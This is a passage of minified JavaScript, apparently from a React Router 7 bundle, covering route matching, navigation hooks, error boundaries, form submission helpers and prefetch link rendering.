G=Ng(L.location,x,D);p=v();let B=U1(G,p),ee=L.createHref(G);c.replaceState(B,"",ee),l&&f&&f({action:d,location:L.location,delta:0})}function R(x){return D_(x)}let L={get action(){return d},get location(){return a(r,c)},listen(x){if(f)throw new Error("A history only accepts one active listener");return r.addEventListener(z1,y),f=x,()=>{r.removeEventListener(z1,y),f=null}},createHref(x){return e(r,x)},createURL:R,encodeLocation(x){let D=R(x);return{pathname:D.pathname,search:D.search,hash:D.hash}},push:S,replace:A,go(x){return c.go(x)}};return L}function D_(a,e=!1){let t="http://localhost";typeof window<"u"&&(t=window.location.origin!=="null"?window.location.origin:window.location.href),Ia(t,"No window.location.(origin|href) available to create URL");let o=typeof a=="string"?a:ru(a);return o=o.replace(/ $/,"%20"),!e&&o.startsWith("//")&&(o=t+o),new URL(o,t)}function yx(a,e,t="/"){return w_(a,e,t,!1)}function w_(a,e,t,o){let r=typeof e=="string"?bl(e):e,l=ti(r.pathname||"/",t);if(l==null)return null;let c=Ex(a);M_(c);let d=null;for(let f=0;d==null&&f<c.length;++f){let p=G_(l);d=F_(c[f],p,o)}return d}function Ex(a,e=[],t=[],o="",r=!1){let l=(c,d,f=r,p)=>{let v={relativePath:p===void 0?c.path||"":p,caseSensitive:c.caseSensitive===!0,childrenIndex:d,route:c};if(v.relativePath.startsWith("/")){if(!v.relativePath.startsWith(o)&&f)return;Ia(v.relativePath.startsWith(o),`Absolute route path "${v.relativePath}" nested under path "${o}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),v.relativePath=v.relativePath.slice(o.length)}let y=Yo([o,v.relativePath]),S=t.concat(v);c.children&&c.children.length>0&&(Ia(c.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${y}".`),Ex(c.children,e,S,y,f)),!(c.path==null&&!c.index)&&e.push({path:y,score:B_(y,c.index),routesMeta:S})};return a.forEach((c,d)=>{if(c.path===""||!c.path?.includes("?"))l(c,d);else for(let f of Sx(c.path))l(c,d,!0,f)}),e}function Sx(a){let e=a.split("/");if(e.length===0)return[];let[t,...o]=e,r=t.endsWith("?"),l=t.replace(/\?$/,"");if(o.length===0)return r?[l,""]:[l];let c=Sx(o.join("/")),d=[];return d.push(...c.map(f=>f===""?l:[l,f].join("/"))),r&&d.push(...c),d.map(f=>a.startsWith("/")&&f===""?"/":f)}function M_(a){a.sort((e,t)=>e.score!==t.score?t.score-e.score:V_(e.routesMeta.map(o=>o.childrenIndex),t.routesMeta.map(o=>o.childrenIndex)))}var __=/^:[\w-]+$/,k_=3,N_=2,O_=1,z_=10,U_=-2,B1=a=>a==="*";function B_(a,e){let t=a.split("/"),o=t.length;return t.some(B1)&&(o+=U_),e&&(o+=N_),t.filter(r=>!B1(r)).reduce((r,l)=>r+(__.test(l)?k_:l===""?O_:z_),o)}function V_(a,e){return a.length===e.length&&a.slice(0,-1).every((o,r)=>o===e[r])?a[a.length-1]-e[e.length-1]:0}function F_(a,e,t=!1){let{routesMeta:o}=a,r={},l="/",c=[];for(let d=0;d<o.length;++d){let f=o[d],p=d===o.length-1,v=l==="/"?e:e.slice(l.length)||"/",y=Jp({path:f.relativePath,caseSensitive:f.caseSensitive,end:p},v),S=f.route;if(!y&&p&&t&&!o[o.length-1].route.index&&(y=Jp({path:f.relativePath,caseSensitive:f.caseSensitive,end:!1},v)),!y)return null;Object.assign(r,y.params),c.push({params:r,pathname:Yo([l,y.pathname]),pathnameBase:K_(Yo([l,y.pathnameBase])),route:S}),y.pathnameBase!=="/"&&(l=Yo([l,y.pathnameBase]))}return c}function Jp(a,e){typeof a=="string"&&(a={path:a,caseSensitive:!1,end:!0});let[t,o]=H_(a.path,a.caseSensitive,a.end),r=e.match(t);if(!r)return null;let l=r[0],c=l.replace(/(.)\/+$/,"$1"),d=r.slice(1);return{params:o.reduce((p,{paramName:v,isOptional:y},S)=>{if(v==="*"){let R=d[S]||"";c=l.slice(0,l.length-R.length).replace(/(.)\/+$/,"$1")}const A=d[S];return y&&!A?p[v]=void 0:p[v]=(A||"").replace(/%2F/g,"/"),p},{}),pathname:l,pathnameBase:c,pattern:a}}function H_(a,e=!1,t=!0){zn(a==="*"||!a.endsWith("*")||a.endsWith("/*"),`Route path "${a}" will be treated as if it were "${a.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${a.replace(/\*$/,"/*")}".`);let o=[],r="^"+a.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(c,d,f)=>(o.push({paramName:d,isOptional:f!=null}),f?"/?([^\\/]+)?":"/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return a.endsWith("*")?(o.push({paramName:"*"}),r+=a==="*"||a==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":a!==""&&a!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,e?void 0:"i"),o]}function G_(a){try{return a.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return zn(!1,`The URL path "${a}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),a}}function ti(a,e){if(e==="/")return a;if(!a.toLowerCase().startsWith(e.toLowerCase()))return null;let t=e.endsWith("/")?e.length-1:e.length,o=a.charAt(t);return o&&o!=="/"?null:a.slice(t)||"/"}var J_=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;function Q_(a,e="/"){let{pathname:t,search:o="",hash:r=""}=typeof a=="string"?bl(a):a,l;return t?(t=t.replace(/\/\/+/g,"/"),t.startsWith("/")?l=V1(t.substring(1),"/"):l=V1(t,e)):l=e,{pathname:l,search:$_(o),hash:Y_(r)}}function V1(a,e){let t=e.replace(/\/+$/,"").split("/");return a.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function Vh(a,e,t,o){return`Cannot include a '${a}' character in a manually specified \`to.${e}\` field [${JSON.stringify(o)}].  Please separate it out to the \`to.${t}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function W_(a){return a.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function Hb(a){let e=W_(a);return e.map((t,o)=>o===e.length-1?t.pathname:t.pathnameBase)}function Gb(a,e,t,o=!1){let r;typeof a=="string"?r=bl(a):(r={...a},Ia(!r.pathname||!r.pathname.includes("?"),Vh("?","pathname","search",r)),Ia(!r.pathname||!r.pathname.includes("#"),Vh("#","pathname","hash",r)),Ia(!r.search||!r.search.includes("#"),Vh("#","search","hash",r)));let l=a===""||r.pathname==="",c=l?"/":r.pathname,d;if(c==null)d=t;else{let y=e.length-1;if(!o&&c.startsWith("..")){let S=c.split("/");for(;S[0]==="..";)S.shift(),y-=1;r.pathname=S.join("/")}d=y>=0?e[y]:"/"}let f=Q_(r,d),p=c&&c!=="/"&&c.endsWith("/"),v=(l||c===".")&&t.endsWith("/");return!f.pathname.endsWith("/")&&(p||v)&&(f.pathname+="/"),f}var Yo=a=>a.join("/").replace(/\/\/+/g,"/"),K_=a=>a.replace(/\/+$/,"").replace(/^\/*/,"/"),$_=a=>!a||a==="?"?"":a.startsWith("?")?a:"?"+a,Y_=a=>!a||a==="#"?"":a.startsWith("#")?a:"#"+a,X_=class{constructor(a,e,t,o=!1){this.status=a,this.statusText=e||"",this.internal=o,t instanceof Error?(this.data=t.toString(),this.error=t):this.data=t}};function Z_(a){return a!=null&&typeof a.status=="number"&&typeof a.statusText=="string"&&typeof a.internal=="boolean"&&"data"in a}function ek(a){return a.map(e=>e.route.path).filter(Boolean).join("/").replace(/\/\/*/g,"/")||"/"}var Cx=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";function Ax(a,e){let t=a;if(typeof t!="string"||!J_.test(t))return{absoluteURL:void 0,isExternal:!1,to:t};let o=t,r=!1;if(Cx)try{let l=new URL(window.location.href),c=t.startsWith("//")?new URL(l.protocol+t):new URL(t),d=ti(c.pathname,e);c.origin===l.origin&&d!=null?t=d+c.search+c.hash:r=!0}catch{zn(!1,`<Link to="${t}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:o,isExternal:r,to:t}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var Tx=["POST","PUT","PATCH","DELETE"];new Set(Tx);var ak=["GET",...Tx];new Set(ak);var vl=F.createContext(null);vl.displayName="DataRouter";var bm=F.createContext(null);bm.displayName="DataRouterState";var tk=F.createContext(!1),xx=F.createContext({isTransitioning:!1});xx.displayName="ViewTransition";var nk=F.createContext(new Map);nk.displayName="Fetchers";var ok=F.createContext(null);ok.displayName="Await";var en=F.createContext(null);en.displayName="Navigation";var Eu=F.createContext(null);Eu.displayName="Location";var Un=F.createContext({outlet:null,matches:[],isDataRoute:!1});Un.displayName="Route";var Jb=F.createContext(null);Jb.displayName="RouteError";var jx="REACT_ROUTER_ERROR",ik="REDIRECT",rk="ROUTE_ERROR_RESPONSE";function sk(a){if(a.startsWith(`${jx}:${ik}:{`))try{let e=JSON.parse(a.slice(28));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.location=="string"&&typeof e.reloadDocument=="boolean"&&typeof e.replace=="boolean")return e}catch{}}function lk(a){if(a.startsWith(`${jx}:${rk}:{`))try{let e=JSON.parse(a.slice(40));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string")return new X_(e.status,e.statusText,e.data)}catch{}}function ck(a,{relative:e}={}){Ia(yl(),"useHref() may be used only in the context of a <Router> component.");let{basename:t,navigator:o}=F.useContext(en),{hash:r,pathname:l,search:c}=Su(a,{relative:e}),d=l;return t!=="/"&&(d=l==="/"?t:Yo([t,l])),o.createHref({pathname:d,search:c,hash:r})}function yl(){return F.useContext(Eu)!=null}function Bn(){return Ia(yl(),"useLocation() may be used only in the context of a <Router> component."),F.useContext(Eu).location}var Px="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function qx(a){F.useContext(en).static||F.useLayoutEffect(a)}function ir(){let{isDataRoute:a}=F.useContext(Un);return a?Ak():uk()}function uk(){Ia(yl(),"useNavigate() may be used only in the context of a <Router> component.");let a=F.useContext(vl),{basename:e,navigator:t}=F.useContext(en),{matches:o}=F.useContext(Un),{pathname:r}=Bn(),l=JSON.stringify(Hb(o)),c=F.useRef(!1);return qx(()=>{c.current=!0}),F.useCallback((f,p={})=>{if(zn(c.current,Px),!c.current)return;if(typeof f=="number"){t.go(f);return}let v=Gb(f,JSON.parse(l),r,p.relative==="path");a==null&&e!=="/"&&(v.pathname=v.pathname==="/"?e:Yo([e,v.pathname])),(p.replace?t.replace:t.push)(v,p.state,p)},[e,t,l,r,a])}F.createContext(null);function dk(){let{matches:a}=F.useContext(Un),e=a[a.length-1];return e?e.params:{}}function Su(a,{relative:e}={}){let{matches:t}=F.useContext(Un),{pathname:o}=Bn(),r=JSON.stringify(Hb(t));return F.useMemo(()=>Gb(a,JSON.parse(r),o,e==="path"),[a,r,o,e])}function pk(a,e){return Rx(a,e)}function Rx(a,e,t,o,r){Ia(yl(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:l}=F.useContext(en),{matches:c}=F.useContext(Un),d=c[c.length-1],f=d?d.params:{},p=d?d.pathname:"/",v=d?d.pathnameBase:"/",y=d&&d.route;{let G=y&&y.path||"";Ix(p,!y||G.endsWith("*")||G.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${p}" (under <Route path="${G}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${G}"> to <Route path="${G==="/"?"*":`${G}/*`}">.`)}let S=Bn(),A;if(e){let G=typeof e=="string"?bl(e):e;Ia(v==="/"||G.pathname?.startsWith(v),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${v}" but pathname "${G.pathname}" was given in the \`location\` prop.`),A=G}else A=S;let R=A.pathname||"/",L=R;if(v!=="/"){let G=v.replace(/^\//,"").split("/");L="/"+R.replace(/^\//,"").split("/").slice(G.length).join("/")}let x=yx(a,{pathname:L});zn(y||x!=null,`No routes matched location "${A.pathname}${A.search}${A.hash}" `),zn(x==null||x[x.length-1].route.element!==void 0||x[x.length-1].route.Component!==void 0||x[x.length-1].route.lazy!==void 0,`Matched leaf route at location "${A.pathname}${A.search}${A.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let D=bk(x&&x.map(G=>Object.assign({},G,{params:Object.assign({},f,G.params),pathname:Yo([v,l.encodeLocation?l.encodeLocation(G.pathname.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:G.pathname]),pathnameBase:G.pathnameBase==="/"?v:Yo([v,l.encodeLocation?l.encodeLocation(G.pathnameBase.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:G.pathnameBase])})),c,t,o,r);return e&&D?F.createElement(Eu.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...A},navigationType:"POP"}},D):D}function mk(){let a=Ck(),e=Z_(a)?`${a.status} ${a.statusText}`:a instanceof Error?a.message:JSON.stringify(a),t=a instanceof Error?a.stack:null,o="rgba(200,200,200, 0.5)",r={padding:"0.5rem",backgroundColor:o},l={padding:"2px 4px",backgroundColor:o},c=null;return console.error("Error handled by React Router default ErrorBoundary:",a),c=F.createElement(F.Fragment,null,F.createElement("p",null," Hey developer "),F.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",F.createElement("code",{style:l},"ErrorBoundary")," or"," ",F.createElement("code",{style:l},"errorElement")," prop on your route.")),F.createElement(F.Fragment,null,F.createElement("h2",null,"Unexpected Application Error!"),F.createElement("h3",{style:{fontStyle:"italic"}},e),t?F.createElement("pre",{style:r},t):null,c)}var fk=F.createElement(mk,null),Lx=class extends F.Component{constructor(a){super(a),this.state={location:a.location,revalidation:a.revalidation,error:a.error}}static getDerivedStateFromError(a){return{error:a}}static getDerivedStateFromProps(a,e){return e.location!==a.location||e.revalidation!=="idle"&&a.revalidation==="idle"?{error:a.error,location:a.location,revalidation:a.revalidation}:{error:a.error!==void 0?a.error:e.error,location:e.location,revalidation:a.revalidation||e.revalidation}}componentDidCatch(a,e){this.props.onError?this.props.onError(a,e):console.error("React Router caught the following error during render",a)}render(){let a=this.state.error;if(this.context&&typeof a=="object"&&a&&"digest"in a&&typeof a.digest=="string"){const t=lk(a.digest);t&&(a=t)}let e=a!==void 0?F.createElement(Un.Provider,{value:this.props.routeContext},F.createElement(Jb.Provider,{value:a,children:this.props.component})):this.props.children;return this.context?F.createElement(hk,{error:a},e):e}};Lx.contextType=tk;var Fh=new WeakMap;function hk({children:a,error:e}){let{basename:t}=F.useContext(en);if(typeof e=="object"&&e&&"digest"in e&&typeof e.digest=="string"){let o=sk(e.digest);if(o){let r=Fh.get(e);if(r)throw r;let l=Ax(o.location,t);if(Cx&&!Fh.get(e))if(l.isExternal||o.reloadDocument)window.location.href=l.absoluteURL||l.to;else{const c=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(l.to,{replace:o.replace}));throw Fh.set(e,c),c}return F.createElement("meta",{httpEquiv:"refresh",content:`0;url=${l.absoluteURL||l.to}`})}}return a}function gk({routeContext:a,match:e,children:t}){let o=F.useContext(vl);return o&&o.static&&o.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(o.staticContext._deepestRenderedBoundaryId=e.route.id),F.createElement(Un.Provider,{value:a},t)}function bk(a,e=[],t=null,o=null,r=null){if(a==null){if(!t)return null;if(t.errors)a=t.matches;else if(e.length===0&&!t.initialized&&t.matches.length>0)a=t.matches;else return null}let l=a,c=t?.errors;if(c!=null){let v=l.findIndex(y=>y.route.id&&c?.[y.route.id]!==void 0);Ia(v>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(c).join(",")}`),l=l.slice(0,Math.min(l.length,v+1))}let d=!1,f=-1;if(t)for(let v=0;v<l.length;v++){let y=l[v];if((y.route.HydrateFallback||y.route.hydrateFallbackElement)&&(f=v),y.route.id){let{loaderData:S,errors:A}=t,R=y.route.loader&&!S.hasOwnProperty(y.route.id)&&(!A||A[y.route.id]===void 0);if(y.route.lazy||R){d=!0,f>=0?l=l.slice(0,f+1):l=[l[0]];break}}}let p=t&&o?(v,y)=>{o(v,{location:t.location,params:t.matches?.[0]?.params??{},unstable_pattern:ek(t.matches),errorInfo:y})}:void 0;return l.reduceRight((v,y,S)=>{let A,R=!1,L=null,x=null;t&&(A=c&&y.route.id?c[y.route.id]:void 0,L=y.route.errorElement||fk,d&&(f<0&&S===0?(Ix("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),R=!0,x=null):f===S&&(R=!0,x=y.route.hydrateFallbackElement||null)));let D=e.concat(l.slice(0,S+1)),G=()=>{let B;return A?B=L:R?B=x:y.route.Component?B=F.createElement(y.route.Component,null):y.route.element?B=y.route.element:B=v,F.createElement(gk,{match:y,routeContext:{outlet:v,matches:D,isDataRoute:t!=null},children:B})};return t&&(y.route.ErrorBoundary||y.route.errorElement||S===0)?F.createElement(Lx,{location:t.location,revalidation:t.revalidation,component:L,error:A,children:G(),routeContext:{outlet:null,matches:D,isDataRoute:!0},onError:p}):G()},null)}function Qb(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function vk(a){let e=F.useContext(vl);return Ia(e,Qb(a)),e}function yk(a){let e=F.useContext(bm);return Ia(e,Qb(a)),e}function Ek(a){let e=F.useContext(Un);return Ia(e,Qb(a)),e}function Wb(a){let e=Ek(a),t=e.matches[e.matches.length-1];return Ia(t.route.id,`${a} can only be used on routes that contain a unique "id"`),t.route.id}function Sk(){return Wb("useRouteId")}function Ck(){let a=F.useContext(Jb),e=yk("useRouteError"),t=Wb("useRouteError");return a!==void 0?a:e.errors?.[t]}function Ak(){let{router:a}=vk("useNavigate"),e=Wb("useNavigate"),t=F.useRef(!1);return qx(()=>{t.current=!0}),F.useCallback(async(r,l={})=>{zn(t.current,Px),t.current&&(typeof r=="number"?await a.navigate(r):await a.navigate(r,{fromRouteId:e,...l}))},[a,e])}var F1={};function Ix(a,e,t){!e&&!F1[a]&&(F1[a]=!0,zn(!1,t))}F.memo(Tk);function Tk({routes:a,future:e,state:t,onError:o}){return Rx(a,void 0,t,o,e)}function Dx({to:a,replace:e,state:t,relative:o}){Ia(yl(),"<Navigate> may be used only in the context of a <Router> component.");let{static:r}=F.useContext(en);zn(!r,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:l}=F.useContext(Un),{pathname:c}=Bn(),d=ir(),f=Gb(a,Hb(l),c,o==="path"),p=JSON.stringify(f);return F.useEffect(()=>{d(JSON.parse(p),{replace:e,state:t,relative:o})},[d,p,o,e,t]),null}function _t(a){Ia(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function xk({basename:a="/",children:e=null,location:t,navigationType:o="POP",navigator:r,static:l=!1,unstable_useTransitions:c}){Ia(!yl(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let d=a.replace(/^\/*/,"/"),f=F.useMemo(()=>({basename:d,navigator:r,static:l,unstable_useTransitions:c,future:{}}),[d,r,l,c]);typeof t=="string"&&(t=bl(t));let{pathname:p="/",search:v="",hash:y="",state:S=null,key:A="default"}=t,R=F.useMemo(()=>{let L=ti(p,d);return L==null?null:{location:{pathname:L,search:v,hash:y,state:S,key:A},navigationType:o}},[d,p,v,y,S,A,o]);return zn(R!=null,`<Router basename="${d}"> is not able to match the URL "${p}${v}${y}" because it does not start with the basename, so the <Router> won't render anything.`),R==null?null:F.createElement(en.Provider,{value:f},F.createElement(Eu.Provider,{children:e,value:R}))}function jk({children:a,location:e}){return pk(Og(a),e)}function Og(a,e=[]){let t=[];return F.Children.forEach(a,(o,r)=>{if(!F.isValidElement(o))return;let l=[...e,r];if(o.type===F.Fragment){t.push.apply(t,Og(o.props.children,l));return}Ia(o.type===_t,`[${typeof o.type=="string"?o.type:o.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),Ia(!o.props.index||!o.props.children,"An index route cannot have child routes.");let c={id:o.props.id||l.join("-"),caseSensitive:o.props.caseSensitive,element:o.props.element,Component:o.props.Component,index:o.props.index,path:o.props.path,middleware:o.props.middleware,loader:o.props.loader,action:o.props.action,hydrateFallbackElement:o.props.hydrateFallbackElement,HydrateFallback:o.props.HydrateFallback,errorElement:o.props.errorElement,ErrorBoundary:o.props.ErrorBoundary,hasErrorBoundary:o.props.hasErrorBoundary===!0||o.props.ErrorBoundary!=null||o.props.errorElement!=null,shouldRevalidate:o.props.shouldRevalidate,handle:o.props.handle,lazy:o.props.lazy};o.props.children&&(c.children=Og(o.props.children,l)),t.push(c)}),t}var Ep="get",Sp="application/x-www-form-urlencoded";function vm(a){return typeof HTMLElement<"u"&&a instanceof HTMLElement}function Pk(a){return vm(a)&&a.tagName.toLowerCase()==="button"}function qk(a){return vm(a)&&a.tagName.toLowerCase()==="form"}function Rk(a){return vm(a)&&a.tagName.toLowerCase()==="input"}function Lk(a){return!!(a.metaKey||a.altKey||a.ctrlKey||a.shiftKey)}function Ik(a,e){return a.button===0&&(!e||e==="_self")&&!Lk(a)}var ap=null;function Dk(){if(ap===null)try{new FormData(document.createElement("form"),0),ap=!1}catch{ap=!0}return ap}var wk=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function Hh(a){return a!=null&&!wk.has(a)?(zn(!1,`"${a}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Sp}"`),null):a}function Mk(a,e){let t,o,r,l,c;if(qk(a)){let d=a.getAttribute("action");o=d?ti(d,e):null,t=a.getAttribute("method")||Ep,r=Hh(a.getAttribute("enctype"))||Sp,l=new FormData(a)}else if(Pk(a)||Rk(a)&&(a.type==="submit"||a.type==="image")){let d=a.form;if(d==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let f=a.getAttribute("formaction")||d.getAttribute("action");if(o=f?ti(f,e):null,t=a.getAttribute("formmethod")||d.getAttribute("method")||Ep,r=Hh(a.getAttribute("formenctype"))||Hh(d.getAttribute("enctype"))||Sp,l=new FormData(d,a),!Dk()){let{name:p,type:v,value:y}=a;if(v==="image"){let S=p?`${p}.`:"";l.append(`${S}x`,"0"),l.append(`${S}y`,"0")}else p&&l.append(p,y)}}else{if(vm(a))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');t=Ep,o=null,r=Sp,c=a}return l&&r==="text/plain"&&(c=l,l=void 0),{action:o,method:t.toLowerCase(),encType:r,formData:l,body:c}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function Kb(a,e){if(a===!1||a===null||typeof a>"u")throw new Error(e)}function _k(a,e,t,o){let r=typeof a=="string"?new URL(a,typeof window>"u"?"server://singlefetch/":window.location.origin):a;return t?r.pathname.endsWith("/")?r.pathname=`${r.pathname}_.${o}`:r.pathname=`${r.pathname}.${o}`:r.pathname==="/"?r.pathname=`_root.${o}`:e&&ti(r.pathname,e)==="/"?r.pathname=`${e.replace(/\/$/,"")}/_root.${o}`:r.pathname=`${r.pathname.replace(/\/$/,"")}.${o}`,r}async function kk(a,e){if(a.id in e)return e[a.id];try{let t=await import(a.module);return e[a.id]=t,t}catch(t){return console.error(`Error loading route module \`${a.module}\`, reloading page...`),console.error(t),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function Nk(a){return a==null?!1:a.href==null?a.rel==="preload"&&typeof a.imageSrcSet=="string"&&typeof a.imageSizes=="string":typeof a.rel=="string"&&typeof a.href=="string"}async function Ok(a,e,t){let o=await Promise.all(a.map(async r=>{let l=e.routes[r.route.id];if(l){let c=await kk(l,t);return c.links?c.links():[]}return[]}));return Vk(o.flat(1).filter(Nk).filter(r=>r.rel==="stylesheet"||r.rel==="preload").map(r=>r.rel==="stylesheet"?{...r,rel:"prefetch",as:"style"}:{...r,rel:"prefetch"}))}function H1(a,e,t,o,r,l){let c=(f,p)=>t[p]?f.route.id!==t[p].route.id:!0,d=(f,p)=>t[p].pathname!==f.pathname||t[p].route.path?.endsWith("*")&&t[p].params["*"]!==f.params["*"];return l==="assets"?e.filter((f,p)=>c(f,p)||d(f,p)):l==="data"?e.filter((f,p)=>{let v=o.routes[f.route.id];if(!v||!v.hasLoader)return!1;if(c(f,p)||d(f,p))return!0;if(f.route.shouldRevalidate){let y=f.route.shouldRevalidate({currentUrl:new URL(r.pathname+r.search+r.hash,window.origin),currentParams:t[0]?.params||{},nextUrl:new URL(a,window.origin),nextParams:f.params,defaultShouldRevalidate:!0});if(typeof y=="boolean")return y}return!0}):[]}function zk(a,e,{includeHydrateFallback:t}={}){return Uk(a.map(o=>{let r=e.routes[o.route.id];if(!r)return[];let l=[r.module];return r.clientActionModule&&(l=l.concat(r.clientActionModule)),r.clientLoaderModule&&(l=l.concat(r.clientLoaderModule)),t&&r.hydrateFallbackModule&&(l=l.concat(r.hydrateFallbackModule)),r.imports&&(l=l.concat(r.imports)),l}).flat(1))}function Uk(a){return[...new Set(a)]}function Bk(a){let e={},t=Object.keys(a).sort();for(let o of t)e[o]=a[o];return e}function Vk(a,e){let t=new Set;return new Set(e),a.reduce((o,r)=>{let l=JSON.stringify(Bk(r));return t.has(l)||(t.add(l),o.push({key:l,link:r})),o},[])}function wx(){let a=F.useContext(vl);return Kb(a,"You must render this element inside a <DataRouterContext.Provider> element"),a}function Fk(){let a=F.useContext(bm);return Kb(a,"You must render this element inside a <DataRouterStateContext.Provider> element"),a}var $b=F.createContext(void 0);$b.displayName="FrameworkContext";function Mx(){let a=F.useContext($b);return Kb(a,"You must render this element inside a <HydratedRouter> element"),a}function Hk(a,e){let t=F.useContext($b),[o,r]=F.useState(!1),[l,c]=F.useState(!1),{onFocus:d,onBlur:f,onMouseEnter:p,onMouseLeave:v,onTouchStart:y}=e,S=F.useRef(null);F.useEffect(()=>{if(a==="render"&&c(!0),a==="viewport"){let L=D=>{D.forEach(G=>{c(G.isIntersecting)})},x=new IntersectionObserver(L,{threshold:.5});return S.current&&x.observe(S.current),()=>{x.disconnect()}}},[a]),F.useEffect(()=>{if(o){let L=setTimeout(()=>{c(!0)},100);return()=>{clearTimeout(L)}}},[o]);let A=()=>{r(!0)},R=()=>{r(!1),c(!1)};return t?a!=="intent"?[l,S,{}]:[l,S,{onFocus:Tc(d,A),onBlur:Tc(f,R),onMouseEnter:Tc(p,A),onMouseLeave:Tc(v,R),onTouchStart:Tc(y,A)}]:[!1,S,{}]}function Tc(a,e){return t=>{a&&a(t),t.defaultPrevented||e(t)}}function Gk({page:a,...e}){let{router:t}=wx(),o=F.useMemo(()=>yx(t.routes,a,t.basename),[t.routes,a,t.basename]);return o?F.createElement(Qk,{page:a,matches:o,...e}):null}function Jk(a){let{manifest:e,routeModules:t}=Mx(),[o,r]=F.useState([]);return F.useEffect(()=>{let l=!1;return Ok(a,e,t).then(c=>{l||r(c)}),()=>{l=!0}},[a,e,t]),o}function Qk({page:a,matches:e,...t}){let o=Bn(),{future:r,manifest:l,routeModules:c}=Mx(),{basename:d}=wx(),{loaderData:f,matches:p}=Fk(),v=F.useMemo(()=>H1(a,e,p,l,o,"data"),[a,e,p,l,o]),y=F.useMemo(()=>H1(a,e,p,l,o,"assets"),[a,e,p,l,o]),S=F.useMemo(()=>{if(a===o.pathname+o.search+o.hash)return[];let L=new Set,x=!1;if(e.forEach(G=>{let B=l.routes[G.route.id];!B||!B.hasLoader||(!v.some(ee=>ee.route.id===G.route.id)&&G.route.id in f&&c[G.route.id]?.shouldRevalidate||B.hasClientLoader?x=!0:L.add(G.route.id))}),L.size===0)return[];let D=_k(a,d,r.unstable_trailingSlashAwareDataRequests,"data");return x&&L.size>0&&D.searchParams.set("_routes",e.filter(G=>L.has(G.route.id)).map(G=>G.route.id).join(",")),[D.pathname+D.search]},[d,r.unstable_trailingSlashAwareDataRequests,f,o,l,v,e,a,c]),A=F.useMemo(()=>zk(y,l),[y,l]),R=Jk(y);return F.createElement(F.Fragment,null,S.map(L=>F.createElement("link",{key:L,rel:"prefetch",as:"fetch",href:L,...t})),A.map(L=>F.createElement("link",{key:L,rel:"modulepreload",href:L,...t})),R.map(({key:L,link:x})=>F.createElement("link",{key:L,nonce:t.nonce,...x,crossOrigin:x.crossOrigin??t.crossOrigin})))}function Wk(...a){return e=>{a.forEach(t=>{typeof t=="function"?t(e):t!=null&&(t.current=e)})}}var Kk=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{Kk&&(window.__reactRouterVersion="7.13.0")}catch{}function $k({basename:a,children:e,unstable_useTransitions:t,window:o}){let r=F.useRef();r.current==null&&(r.current=R_({window:o,v5Compat:!0}));let l=r.current,[c,d]=F.useState({action:l.action,location:l.location}),f=F.useCallback(p=>{t===!1?d(p):F.startTransition(()=>d(p))},[t]);return F.useLayoutEffect(()=>l.listen(f),[l,f]),F.createElement(xk,{basename:a,children:e,location:c.location,navigationType:c.action,navigator:l,unstable_useTransitions:t})}var _x=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Xt=F.forwardRef(function({onClick:e,discover:t="render",prefetch:o="none",relative:r,reloadDocument:l,replace:c,state:d,target:f,to:p,preventScrollReset:v,viewTransition:y,unstable_defaultShouldRevalidate:S,...A},R){let{basename:L,unstable_useTransitions:x}=F.useContext(en),D=typeof 